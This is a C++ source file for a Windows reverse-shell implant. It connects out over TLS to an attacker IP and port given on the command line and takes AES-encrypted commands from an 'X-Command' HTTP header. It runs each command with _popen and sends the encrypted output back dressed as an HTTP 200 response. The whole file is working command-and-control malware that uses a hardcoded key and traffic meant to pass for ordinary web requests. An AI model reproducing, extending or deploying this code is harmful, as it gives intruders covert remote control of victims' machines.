#include <winsock2.h>
#include <windows.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <vector>
#include <stdexcept>
#include <stdio.h>
#include "AES_CBC.h"
#include <iostream>
#include <string>
#include <sstream>
#pragma comment(lib, "WS2_32")
#pragma comment(lib, "crypt32")

// Initialize OpenSSL by loading error strings and algorithms.
void InitializeSSL() {
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();
}

// Create an SSL context for TLS communication.
// Uses the TLS client method to configure the context.
SSL_CTX* CreateSSLContext() {
    const SSL_METHOD* method = TLS_client_method();
    SSL_CTX* ctx = SSL_CTX_new(method);

    if (!ctx) {
        perror("Unable to create SSL context");
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    return ctx;
}

// Clean up OpenSSL by freeing resources.
void CleanupSSL() {
    EVP_cleanup();
}

// Extract the "X-Command" header value from an HTTP request.
// Returns the value of the header or an empty string if not found.
std::string ExtractCommand(const std::string& request) {
    std::string header = "X-Command: ";
    size_t pos = request.find(header);
    if (pos != std::string::npos) {
        size_t end_pos = request.find("\r\n", pos);
        return request.substr(pos + header.length(), end_pos - pos - header.length());
    }
    return "";
}

int main(int argc, char* argv[]) {
    // Validate arguments for attacker IP and port.
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <ATTACKER_IP> <ATTACKER_PORT>" << std::endl;
        return 1;
    }

    char* ATTACKER_IP = argv[1];
    short ATTACKER_PORT = static_cast<short>(std::atoi(argv[2]));

    if (ATTACKER_PORT <= 0 || ATTACKER_PORT > 65535) {
        std::cerr << "Error: Port must be between 1 and 65535." << std::endl;
        return 1;
    }

    // Initialize Winsock.
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // Create a TCP socket.
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("Socket creation failed: %d\n", WSAGetLastError());
        return 1;
    }

    // Configure the server address and port.
    struct sockaddr_in server;
    server.sin_addr.s_addr = inet_addr(ATTACKER_IP);
    server.sin_family = AF_INET;
    server.sin_port = htons(ATTACKER_PORT);

    // Attempt to connect to the server.
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        printf("Connection failed: %d\n", WSAGetLastError());
        return 1;
    }

    // Initialize SSL and create an SSL context.
    InitializeSSL();
    SSL_CTX* ctx = CreateSSLContext();

    // Create an SSL object and associate it with the socket.
    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);

    // Establish an SSL/TLS connection.
    if (SSL_connect(ssl) <= 0) {
        ERR_print_errors_fp(stderr);
    }
    else {
        printf("Connected with %s encryption\n", SSL_get_cipher(ssl));

        char buffer[4096];
        while (true) {
            // Read data from the server.
            int bytes = SSL_read(ssl, buffer, sizeof(buffer) - 1);
            if (bytes > 0) {
                buffer[bytes] = '\0';
                printf("[+] Received request:\n%s\n", buffer);

                std::string request(buffer);
                std::string command = ExtractCommand(request); // Extract the "X-Command" header.

                // Encryption key and IV for AES-128.
                unsigned char key[16] = { 0x2b, 0x7e, 0x15, 0x16, 0x28, 0x6d, 0x29, 0x58, 0x41, 0x60, 0x74, 0x5c, 0x3e, 0x7b, 0x71, 0x3a };
                unsigned char iv[16] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };

                // Create an AES_CBC object for encryption and decryption.
                AES_CBC aes(key, iv);

                // Decrypt the command from the HTTP header.
                std::string decryptedCommand = decryptCommand(command, aes);

                if (!decryptedCommand.empty()) {
                    printf("[+] Executing command: %s\n", decryptedCommand.c_str());

                    // Execute the decrypted command.
                    FILE* fp = _popen(decryptedCommand.c_str(), "r");
                    if (!fp) {
                        printf("[-] Failed to execute command\n");
                        break;
                    }

                    std::ostringstream response;
                    char result[1024];
                    while (fgets(result, sizeof(result), fp) != NULL) {
                        response << result;
                    }
                    _pclose(fp);

                    printf("[+] response: %s\n", result);

                    // Encrypt the response.
                    std::string encryptedResponse = encryptCommand(response.str(), aes);

                    // Format the response as an HTTP response.
                    std::ostringstream httpResponse;
                    httpResponse << "HTTP/1.1 200 OK\r\n"
                        << "Content-Type: text/plain\r\n"
                        << "Content-Length: " << encryptedResponse.length() << "\r\n\r\n"
                        << encryptedResponse;

                    // Log and send the response.
                    std::cout << "Encrypted data: " << encryptedResponse << std::endl;
                    SSL_write(ssl, httpResponse.str().c_str(), httpResponse.str().length());
                }
                else {
                    printf("[-] No valid command found in headers\n");
                }
            }
        }
    }

    // Clean up resources.
    SSL_free(ssl);
    closesocket(sock);
    SSL_CTX_free(ctx);
    CleanupSSL();
    WSACleanup();

    return 0;
}